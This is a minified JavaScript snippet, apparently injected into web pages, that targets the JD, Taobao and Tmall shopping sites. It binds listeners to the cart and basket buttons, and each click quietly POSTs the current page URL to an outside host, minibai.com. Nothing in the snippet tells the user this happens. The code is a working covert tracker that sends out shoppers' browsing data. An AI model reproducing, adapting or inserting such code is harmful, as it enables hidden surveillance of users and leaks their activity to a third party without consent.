!function(e){function t(e){for(var t of["J_LinkBasket","J_juValid","InitCartUrl"]){var n=document.getElementById(t);n&&n.addEventListener("click",e)}}function n(){!function(t){(t=t||{}).type=(t.type||"GET").toUpperCase(),t.dataType=t.dataType||"json",t.async=t.async||!0,t.timeout=t.timeout||100;var n,o=function(e){var t=[];for(var n in e)t.push(encodeURIComponent(n)+"="+encodeURIComponent(e[n]));return t.join("&")}(t.data),a=null;e.clearTimeout(a),n=e.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP");n.onreadystatechange=function(){if(4==n.readyState){var o=n.status;o>=200&&o<300?(e.clearTimeout(a),t.success&&t.success(n.responseText,n.responseXML)):(e.clearTimeout(a),t.error&&t.error(o))}},"GET"==t.type?(n.open("GET",t.url+"?"+o,t.async),n.send(null)):"POST"==t.type&&(n.open("POST",t.url,t.async),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(o));a=e.setTimeout(function(){e.clearTimeout(a),n.abort()}.bind(this),t.timeout)}({type:"post",url:"//cclientreport2.minibai.com/tmp5log.json",data:{h:e.location.href,t:1}})}(function(e){for(var t of["jd.com","taobao.com","tmall.com"])if(-1!=e.indexOf(t))return!0;return!1})(e.location.host)&&("complete"===document.readyState||"loading"!==document.readyState&&!document.documentElement.doScroll?t(n):document.addEventListener("DOMContentLoaded",function(){t(n)}))}(window.top);